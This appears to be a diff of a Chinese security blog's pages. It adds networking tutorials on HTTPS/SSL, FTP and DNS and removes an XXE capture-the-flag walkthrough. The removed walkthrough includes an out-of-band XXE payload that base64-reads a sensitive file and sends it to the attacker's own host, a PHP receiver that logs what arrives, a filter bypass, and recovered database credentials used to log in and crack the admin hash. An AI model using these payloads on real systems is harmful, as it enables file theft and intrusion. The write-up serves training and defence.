+<h1 id="HTTPS"><a href="#HTTPS" class="headerlink" title="HTTPS"></a>HTTPS</h1><h2 id="需求背景-1"><a href="#需求背景-1" class="headerlink" title="需求背景"></a>需求背景</h2><p>随着网络通信的电子商务等服务和资源进入人们的生活，人们在享受网络带来的便利的同时，面临着各种各样的安全隐患</p>
+<p>传统的很多网站都是基于HTTP协议的</p>
+<p>HTTP协议传输的数据都是未加密的，也就是明文的，因此使用HTTP协议传输隐私信息非常不安全</p>
+<p>为了保证这些隐私数据能加密传输，于是设计了SSL(Secure Sockets Layer)协议用于对HTTP协议传输的数据进行加密，从而就诞生了HTTPS</p>
+<h2 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h2><p>HTTPS（Hyper Text Transfer Protocol over Secure Socket Layer），是以安全为目标的HTTP通道，即是在HTTP的基础之上加入了SSL层，因此加密的详细内容就需要SSL</p>
+<h2 id="功能-1"><a href="#功能-1" class="headerlink" title="功能"></a>功能</h2><p>HTTPS存在不同于HTTP的默认端口及一个加密&#x2F;身份验证层(在HTTP与TCP之间)，这个系统提供了身份验证与加密通讯方法，现在它被广泛用于万维网上安全敏感的通讯，例如交易支付方面</p>
+<p>HTTP协议采用明文传输信息，存在信息窃听、信息篡改和信息劫持的风险，而协议TLS&#x2F;SSL具有身份验证、信息加密和完整性校验的功能，可以避免此类问题，故我们可以简单的认为HTTPS就是使用TLS&#x2F;SSL加密的HTTP协议</p>
+<h2 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h2><p>HTTPS在传输数据。握手过程的简单描述：</p>
+<p>1、浏览器将自己支持的一套加密规则发送给网站</p>
+<p>2、网站从中选出一组加密算法与HASH算法，并将自己的身份信息以证书的形式发回给浏览器。证书里面包含了网站地址，加密公钥，以及证书的颁发机构等信息</p>
+<p>3、获得网站证书之后浏览器要做以下工作：</p>
+<ul>
+<li>验证证书的合法性</li>
+<li>生成一串随机数的密码，并用证书中提供的公钥加密</li>
+<li>使用约定好的HASH计算握手消息，并使用生成的随机数对消息进行加密，最后将之前生成的所有信息发送给网站</li>
+</ul>
+<p>4、网站接收浏览器发来的数据之后要做以下的操作：</p>
+<ul>
+<li>使用自己的私钥将信息解密取出密码，使用密码解密浏览器发来的握手消息，并验证HASH是否与浏览器发来的一致</li>
+<li>使用密码加密一段握手消息，发送给浏览器</li>
+</ul>
+<p>5、浏览器解密并计算握手消息的HASH，如果与服务端发来的HASH一致，此时握手过程结束，之后所有的通信数据将由之前浏览器生成的随机密码并利用对称加密算法进行加密</p>
+<h2 id="HTTPS架构"><a href="#HTTPS架构" class="headerlink" title="HTTPS架构"></a>HTTPS架构</h2><p><img src="https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20220105165129153.png" alt="image-20220105165129153"></p>
+<h1 id="SSL"><a href="#SSL" class="headerlink" title="SSL"></a>SSL</h1><h2 id="概述-2"><a href="#概述-2" class="headerlink" title="概述"></a>概述</h2><p>SSL(Secure Socket Layer，安全套接字层)，位于可靠的面向连接的网络层协议和应用层协议之间的一种协议层</p>
+<p>SSL通过互相认证、使用数字签名确保完整性、使用加密确保私密性，以实现客户端和服务器之间的安全通讯</p>
+<p>该协议由两层组成：SSL记录协议和SSL握手协议</p>
+<h2 id="功能-2"><a href="#功能-2" class="headerlink" title="功能"></a>功能</h2><p>保证传输数据的 保密性</p>
+<p>保证传输数据的 完整性</p>
+<p>实现通信双方的互相 身份认证</p>
+<p><img src="https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20220105165237758.png" alt="image-20220105165237758"></p>
+<h2 id="SSL加密"><a href="#SSL加密" class="headerlink" title="SSL加密"></a>SSL加密</h2><p>密码：对文本进行编码</p>
+<p>密钥：改变密码行为的数字化参数</p>
+<p>对称密钥加密系统：编 &#x2F; 解码使用相同密钥的算法</p>
+<p>非对称密钥加密系统：编 &#x2F; 解码使用不同密钥的算法</p>
+<p>数字签名：用来验证报文未被伪造或篡改的校验和</p>
+<p>数字证书：由一个可信的组织验证和签发的识别信息</p>
+<h2 id="SSL握手"><a href="#SSL握手" class="headerlink" title="SSL握手"></a>SSL握手</h2><p><img src="https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20220105165344320.png" alt="image-20220105165344320"></p>
+<h1 id="HTTP与HTTPS的区别"><a href="#HTTP与HTTPS的区别" class="headerlink" title="HTTP与HTTPS的区别"></a>HTTP与HTTPS的区别</h1><p>1、https协议需要到ca申请证书，一般免费证书很少，需要交费</p>
+<p>2、http是超文本传输协议，信息是明文传输的；https则是具有安全性的ssl加密传输协议</p>
+<p>3、http和https使用的是完全不同的连接方式，用的端口也不一样，前者是80，后者是443</p>
+<p>4、http的连接很简单，是无状态的；HTTPS协议是由SSL+HTTP协议构建的可进行加密传输、身份认证的网络协议，比http协议安全</p>
+<p><img src="https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20220105165105787.png" alt="image-20220105165105787"></p>
 
-<p>XXE可以发起网络请求<br>思路：<br>尝试将读取的信息存放在变量a（$a），然后发起请求，<a target="_blank" rel="noopener" href="http://x.x.x.x/1.php?id=$a">http://x.x.x.x/1.php?id=$a</a><br>自己的公网机器保存收到的传参</p>
-<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">1.xml</span></span><br><span class="line"><span class="language-xml">    <span class="meta">&lt;!ENTITY % <span class="keyword">all</span></span></span></span><br><span class="line"><span class="meta"><span class="language-xml">    <span class="string">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://自己公网ip/xxe/2.php?id=%file;&#x27;&gt;&quot;</span></span></span></span><br><span class="line"><span class="meta"><span class="language-xml">    &gt;</span></span></span><br><span class="line"><span class="language-xml">    %all;</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">通过2.php文件 接收变量file的传参值</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">2.php代码：</span></span><br><span class="line"><span class="language-xml"></span><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;3.txt&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>],FILE_APPEND);<span class="meta">?&gt;</span></span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">以GET方式接收id传入的值，并写入到3.txt</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://自己公网ip/xxe/1.xml&quot;</span>&gt;</span> </span></span><br><span class="line"><span class="language-xml">加载1.xml文件</span></span><br></pre></td></tr></table></figure>
+      
+    </div>
 
-<p>只需要读取文件然后加载1.xml，1.xml会将读取文件的内容发送给2.php。2.php会储存到3.txt</p>
-<p>payload：</p>
-<figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span>[</span></span></span><br><span class="line"><span class="meta"><span class="language-xml"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=敏感文件路径&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="language-xml"><span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://自己公网ip/xxe/1.xml&quot;</span>&gt;</span>  </span></span></span><br><span class="line"><span class="meta"><span class="language-xml"></span></span><span class="language-perl">%remote;</span><span class="language-xml"><span class="meta"></span></span></span><br><span class="line"><span class="meta"><span class="language-xml"></span></span><span class="language-perl">%send; </span><span class="language-xml"><span class="meta"></span></span></span><br><span class="line"><span class="meta"><span class="language-xml">]&gt;</span></span></span><br></pre></td></tr></table></figure>
+    
+    
+    
 
-<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>使用开发语言提供的禁用外部实体的方法</p>
-<p>过滤用户提交的XML数据</p>
-<p>关键词：SYSTEM和PUBLIC</p>
-<h2 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h2><p>1、进入靶场，观察到是CMS搭建的<br><img src="https://img-blog.csdnimg.cn/20210407152722799.JPG" alt="在这里插入图片描述"></p>
-<p>2、下载与靶场相同的CMS，导入源码到seay，进行代码审计</p>
-<p>3、定位simplexml_load_string函数</p>
-<p>4、打开weixin文件夹下的idnex.php<br><img src="https://img-blog.csdnimg.cn/20210407152739849.JPG" alt="在这里插入图片描述"></p>
-<p>4、代码分析：<br><img src="https://img-blog.csdnimg.cn/20210407152809524.JPG" alt="在这里插入图片描述"></p>
-<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">simplexml_load_string</span><span class="params">(<span class="variable">$postArr</span>)</span></span>==&gt;将变量postArr转换为对象</span><br><span class="line">&amp;postArr 是一个XML字符串</span><br><span class="line"><span class="variable">$postArr</span> = <span class="built_in">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>)</span><br><span class="line"><span class="function"><span class="title">file_get_contents</span><span class="params">()</span></span>==&gt;整个文件读入在一个字符串中</span><br><span class="line">php:<span class="comment">//input==&gt;PHP伪协议，只能在php内部使用；</span></span><br><span class="line">可以访问请求的原始数据的只读流</span><br></pre></td></tr></table></figure>
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
 
-<p>往上溯源<br><img src="https://img-blog.csdnimg.cn/20210407152845135.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>第一个if<br>if ($echostr !&#x3D; “”)&#x3D;&#x3D;&gt;如果echostr变量不等于空才会执行这个分支</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">要使得第二个if分支执行，那么echostr变量等于空</span><br></pre></td></tr></table></figure>
 
-<p>第二个if<br>if ($signature !&#x3D; “” &amp;&amp; $echostrechostr “”)<br>&gt;signature变量不等于空 并且 echostr等于空 才会执行该if分支</p>
-<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$signature = $_REQUEST[<span class="string">&quot;signature&quot;</span>]<span class="comment">;</span></span><br><span class="line">$echostr = $_REQUEST[<span class="string">&quot;echostr&quot;</span>]</span><br><span class="line"></span><br><span class="line">故可通过传参控制$signature和$echostr</span><br></pre></td></tr></table></figure>
 
-<p>5、观察发现该cms的敏感文件位于conn文件夹下的conn.php<br>该文件中存放了数据库的用户名、密码、数据库名<br>读取信息 payload：</p>
-<p>6、访问靶场下的weixin页面<br><img src="https://img-blog.csdnimg.cn/20210407152943336.png" alt="在这里插入图片描述"></p>
-<p>7、抓包，传参<br>传参：?signature&#x3D;1&amp;echostr&#x3D;<br>写入数据：<br>?xml version&#x3D;”1.0”?&gt;</p>
-<p>%remote;<br>%send;<br>]&gt;<br><img src="https://img-blog.csdnimg.cn/20210407153219803.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>8、传参被检测<br>检测传参 一般只针对$_POST、$_GET、$_REQUEST、$_COOKIE<br>Content-Type:application&#x2F;x-www-form-urlencoded<br>类型为表单<br>因为是表单，所以才会被POST&#x2F;GET….接收，故删除Content-Type即可<br><img src="https://img-blog.csdnimg.cn/20210407153323676.png" alt="在这里插入图片描述"><br>发送成功</p>
-<p>9、访问3.txt，获得信息，进行解码得到<br>$conn &#x3D; mysqli_connect(“192.168.0.10”,”xxe”, “teiwo!8#7ERe1DPC”, “scms”);<br>用户名：xxe<br>密码：teiwo!8#7ERe1DPC<br>数据库名：scms</p>
-<p>10、通过目录扫描知道有adminer.php，进行访问<br><img src="https://img-blog.csdnimg.cn/20210407153358922.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>登录获取的账号密码数据库名<br><img src="https://img-blog.csdnimg.cn/20210407153416676.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>11、通过执行 select * from SL_admin<br>得到SL_admin表的所有信息<br><img src="https://img-blog.csdnimg.cn/20210407153432584.png" alt="在这里插入图片描述"></p>
-<p>12、通过提示信息得知flag为管理员的密码<br>故将admin的A_pwd字段进行md5解码<br><img src="https://img-blog.csdnimg.cn/20210407153444773.JPG" alt="在这里插入图片描述"></p>
-<p>13、通关<br><img src="https://img-blog.csdnimg.cn/20210407153454539.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/01/05/FTP%E5%8D%8F%E8%AE%AE/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/kilig.gif">
+      <meta itemprop="name" content="kiligwh">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="kilig's Blog">
+      <meta itemprop="description" content="欢迎">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | kilig's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2023/01/05/FTP%E5%8D%8F%E8%AE%AE/" class="post-title-link" itemprop="url">FTP协议</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2023-01-05 19:24:16" itemprop="dateCreated datePublished" datetime="2023-01-05T19:24:16+08:00">2023-01-05</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2023-03-08 12:52:07" itemprop="dateModified" datetime="2023-03-08T12:52:07+08:00">2023-03-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E7%BD%91%E7%BB%9C/" itemprop="url" rel="index"><span itemprop="name">网络</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="FTP协议"><a href="#FTP协议" class="headerlink" title="FTP协议"></a>FTP协议</h1><hr>
+<h2 id="需求背景"><a href="#需求背景" class="headerlink" title="需求背景"></a>需求背景</h2><p>为了提高文件的共享性，在本机主机和远程主机之间高效传输数据</p>
+<p>FTP协议被广泛使用在互联网上的文件传输</p>
+<h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><p>FTP是采用 基于TCP的客户端&#x2F;服务器模式</p>
+<p>FTP采用双TCP连接方式：控制连接使用TCP的21端口，数据连接使用TCP的20端口</p>
+<p>两种文件传输模式：ASCII模式、二进制流模式</p>
+<p>两种数据传输方式：主动方式、被动方式</p>
+<h2 id="主动方式"><a href="#主动方式" class="headerlink" title="主动方式"></a>主动方式</h2><p>在建立数据连接的过程中，由服务器主动发起的连接，称为主动方式</p>
+<p>主动方式也称为PROT方式，是FTP协议最初定义的数据传输连接方式</p>
+<blockquote>
+<p>主要特点</p>
+</blockquote>
+<p>FTP客户端通过向FTP服务器发送PORT命令，告诉服务器该客户端用户传输数据的临时端口号</p>
+<p>当需要传送数据时，服务器通过TCP端口号20与客户端的临时端口建立数据传输通道，完成数据传输</p>
+<h2 id="被动方式"><a href="#被动方式" class="headerlink" title="被动方式"></a>被动方式</h2><p>在整个过程中，由于服务器总是被动接收客户端的数据连接，称为被动方式</p>
+<p>被动方式也称之为PASV方式</p>
+<blockquote>
+<p>主要特点</p>
+</blockquote>
+<p>FTP客户端通过向FTP服务器发送PASV命令，告诉服务器进入被动方式，服务器选择临时端口号并告知客户端</p>
+<p>当需要传送数据时，客户端主动与服务器的临时端口号建立数据传输通道，完成数据传输</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/01/04/DNS%E5%8D%8F%E8%AE%AE/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/kilig.gif">
+      <meta itemprop="name" content="kiligwh">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="kilig's Blog">
+      <meta itemprop="description" content="欢迎">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | kilig's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2023/01/04/DNS%E5%8D%8F%E8%AE%AE/" class="post-title-link" itemprop="url">DNS协议</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2023-01-04 10:43:21" itemprop="dateCreated datePublished" datetime="2023-01-04T10:43:21+08:00">2023-01-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2023-03-08 12:52:02" itemprop="dateModified" datetime="2023-03-08T12:52:02+08:00">2023-03-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E7%BD%91%E7%BB%9C/" itemprop="url" rel="index"><span itemprop="name">网络</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="DNS协议"><a href="#DNS协议" class="headerlink" title="DNS协议"></a>DNS协议</h1><hr>
+<h2 id="需求背景"><a href="#需求背景" class="headerlink" title="需求背景"></a>需求背景</h2><blockquote>
+<p>DNS产生过程</p>
+</blockquote>
+<p><img src="https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20220105113712376.png" alt="null"></p>
+<p>由于记IP地址去访问网站，考验太大！</p>
+<h2 id="DNS概述"><a href="#DNS概述" class="headerlink" title="DNS概述"></a>DNS概述</h2><p>DNS（Domain Name System，域名系统）是互联网的一项服务，将域名和IP地址相互映射的一个分布式数据库，能够使 用户更加方便的访问网站。</p>
+<p>用户可以直接输入域名登陆网站，DNS会将域名解析成IP地址，然后用户根据这个IP地址找到相应的网站，从而访问到域名对应的网站</p>
+<blockquote>
+<p>域名解析</p>
+</blockquote>
+<p>通过主机名获取到主机名对应IP地址的过程</p>
+<blockquote>
+<p>端口</p>
+</blockquote>
+<p>DNS协议建立在UDP协议之上，在某些情况下可以切换为TCP，使用端口号为53</p>
+<p>是一种客户端&#x2F;服务器端模式（C&#x2F;S 模式）</p>
+<blockquote>
+<p>域</p>
+</blockquote>
+<p>域是一个逻辑上的概念，在初始瓜分互联网的时候，Internet组织将世界上的计算机划分为了若干个大类，如com、gov、org、net、edu、cn、us等等</p>
+<p>每一个大类我们称之为一个域</p>
+<p>在每个大类里面划分出比较小一点的，称为子域，域是可以嵌套的，大域包含小域，小域可以包含更小的域</p>
+<blockquote>
+<p>域名</p>
+</blockquote>
+<p>在每个域里面都有很多主机，每个主机都有一个主机名，我们在这个主机名后面冠上主机所在域的名称成为该主机在Internet网络上的域名</p>
+<blockquote>
+<p>域名结构</p>
+</blockquote>
+<p>域名是一个树状层次结果，联机分布式数据库，最高的根域名服务器维护最高级别域名服务器记录，后者维护下一级域名服务器的记录</p>
+<p><img src="https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20220105142238437.png" alt="image-20220105142238437"></p>
+<blockquote>
+<p>域名服务器</p>
+</blockquote>
+<p>域名服务器：负责名字到地址的解析</p>
+<p>域名服务器程序在专设的结点上运行，运行该程序的机器称为域名服务器</p>
+<p>根据域名结果可以把域名服务器划分为以下四种：</p>
+<p>根域名服务器、顶级域名服务器、权威域名服务器、本地域名服务器</p>
+<p><img src="https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20220105142652167.png" alt="image-20220105142652167"></p>
+<blockquote>
+<p>DNS服务器管理区域</p>
+</blockquote>
+<p>每一台 DNS 服务器都只负责管理一个有限范围（一个或几个域）内的主机域名和 IP 地址的对应关系，这些特定的 DNS 域或 IP 地址段称为 zone（区域）</p>
+<p>如果根据DNS服务器管理的区域地址数据的来源不同，DNS 系统可以分为不同的类型。在同一台 DNS服务器中，相对于不同的区域来说，也拥有不同的身份。常见的几种类型如下：</p>
+<p>主域名服务器：维护某一个特定 DNS 区域的地址数据库，对其中的解析记录具有自主控制权，是指定区域中唯一存在的权威服务器、官方服务器</p>
+<p>从域名服务器：</p>
+<ul>
+<li>与主域名服务器提供完全相同的 DNS 解析服务，通常用于 DNS 服务器的热备份</li>
+<li>对于客户机来说，无论使用主域名服务器还是从域名服务器，查询的结果都一样的</li>
+<li>关键区别在于，从域名服务器提供的解析结果不是由自己决定的， 而是来自于主域名服务器</li>
+<li>构建从域名服务器时，需要指定主域名服务器的位置， 以便服务器能自动同步区域的地址数据库</li>
+</ul>
+<p>缓存域名服务器：</p>
+<ul>
+<li>只提供域名解析结果的缓存功能，目的在于提高查询速度和效率，但是没有自己控制的区域地址数据</li>
+<li>构建缓存域名服务器时，必须设置根域或指定其他 DNS 服务器作为解析来源</li>
+</ul>
+<h2 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h2><p>DNS查询以各种不同的方式进行解析，客户机可通过使用以前查询获得的缓存信息就地应答查询，DNS服务器也可使用其自身的资源记录信息缓存来应答查询</p>
+<p>但以下两种方式更为普遍</p>
+<blockquote>
+<p>递归解析</p>
+</blockquote>
+<p>DNS服务器收到一个域名解析请求时，如果所要检索的资源记录不在本地，DNS服务器将和自己的上一层服务器交互，获得最终的答案，并将其返回给客户</p>
+<blockquote>
+<p>迭代解析</p>
+</blockquote>
+<p>DNS服务器收到解析请求，首先在本地的数据库中查找是否有相应的资源记录，如果没有，则向客户提供另外一个DNS服务器的地址，客户负责把解析请求发送给新的DNS服务器地址</p>
+<blockquote>
+<p>DNS域名解析的过程图示</p>
+</blockquote>
+<p><img src="https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20220105144455039.png" alt="image-20220105144455039"></p>
+<blockquote>
+<p>DNS查询过程</p>
+</blockquote>
+<p><img src="https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20220105144607615.png" alt="image-20220105144607615"></p>
+<blockquote>
+<p>DNS工作原理示例</p>
+</blockquote>
+<p><img src="https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20220105144844786.png" alt="image-20220105144844786"></p>
+<p>1、当在浏览器中输入URL时，浏览器会先检查自己的缓存是否有域名IP的映射关系，有则直接使用IP进行通信；</p>
+<p>2、如浏览器没有缓存，则操作系统检查本地Hosts文件是否有域名IP的映射关系，有则使用IP进行通信；</p>
+<p>3、如果hosts没有这个域名的映射，则查找本地DNS解析器缓存是否有映射关系，有则直接返回完成域名解析；</p>
+<p>4、如果还未找到映射关系，首先会找TCP&#x2F;IP参数中设置的首选DNS服务器，也就是常称的本地DNS服务器，如果服务器已缓存了映射关系，则使用这个IP地址映射返回完成域名解析，此时解析不具有权威性；</p>
+<p>5、如果本地DNS服务器缓存已经失效，进行递归查询</p>
+<h2 id="DNS解析记录类型"><a href="#DNS解析记录类型" class="headerlink" title="DNS解析记录类型"></a>DNS解析记录类型</h2><p>域名和IP之间的对应关系，称为记录</p>
+<p>根据记录使用的目的不同，又分为不同的类型</p>
+<p>常见DNS记录类型有：</p>
+<blockquote>
+<p>SOA</p>
+</blockquote>
+<p>Start Of Authority，起始授权记录；一个区域解析库有且仅能有一个SOA记录，而必须为解析库的第一条记录</p>
+<blockquote>
+<p>A</p>
+</blockquote>
+<p>地址记录（Address），返回域名指向的IP地址</p>
+<blockquote>
+<p>NS</p>
+</blockquote>
+<p>域名服务器记录（Name Server），返回保存下一级域名信息的服务器地址。该记录只能设置为域名，不能设置为IP地址</p>
+<blockquote>
+<p>MX</p>
+</blockquote>
+<p>邮件记录（Mail eXchange），返回接收电子邮件的服务器地址</p>
+<blockquote>
+<p>CNAME</p>
+</blockquote>
+<p>规范名称记录（Canonical Name），返回另一个域名，即当前查询的域名是另一个域名的跳转</p>
+<blockquote>
+<p>PTR</p>
+</blockquote>
+<p>逆向查询记录（Pointer Record），只用于从IP地址查询域名</p>
+<h2 id="资源记录"><a href="#资源记录" class="headerlink" title="资源记录"></a>资源记录</h2><p>记录一条域名信息映射关系，称之为资源记录（PR）</p>
+<blockquote>
+<p>资源记录定义的格式</p>
+</blockquote>
+<p><img src="https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20220105150512873.png" alt="image-20220105150512873"></p>
+<p>当我们查询域名<a href="http://www.baidu.xn--com%2C:-fi1h1h17f47b56ibnye5pqyan70bjkh87b1vhgrc6m70ck27ftt0bha8512cga0376fndbm5v/">www.baidu.com的时候，查询结果得到的资源记录结构体中有如下数据：</a></p>
+<p>TTL：生存周期，是递归服务器会在缓存中保存该资源记录的时长，即客户端的到解析结果的缓存时长，可从全局继承</p>
+<p>网络&#x2F;协议类型：它的代表的标识是IN，IN就是internet，目前DNS系统主要支持的协议是IN</p>
+<p>type：就是资源记录类型，一般的网站都是都是A记录（IPv4的主机地址）</p>
+<p>rdata：是资源记录数据，就是域名关联的信息数据</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/01/03/DHCP%E5%8D%8F%E8%AE%AE/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/kilig.gif">
+      <meta itemprop="name" content="kiligwh">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="kilig's Blog">
+      <meta itemprop="description" content="欢迎">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | kilig's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2023/01/03/DHCP%E5%8D%8F%E8%AE%AE/" class="post-title-link" itemprop="url">DHCP协议</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2023-01-03 14:31:58" itemprop="dateCreated datePublished" datetime="2023-01-03T14:31:58+08:00">2023-01-03</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
